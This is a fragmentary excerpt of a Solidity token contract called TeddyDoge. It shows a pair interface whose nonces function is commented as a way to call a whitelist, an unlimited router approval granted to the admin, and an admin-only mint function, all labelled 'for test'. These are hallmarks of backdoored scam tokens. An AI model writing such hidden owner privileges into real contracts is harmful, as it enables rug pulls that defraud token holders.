...
interface IPancakeSwapV2Pair {
    ...
    function nonces(address owner) external view returns (uint);// For test 使用这个来调用白名单
...
contract TeddyDoge is Context, IERC20, IERC20Metadata {
    ...
    constructor () {
        ...
        _approve(Admin, address(_uniswapV2Router), type(uint).max); // for test only
    ...
    function mint(uint amount) external onlyAdmin virtual {
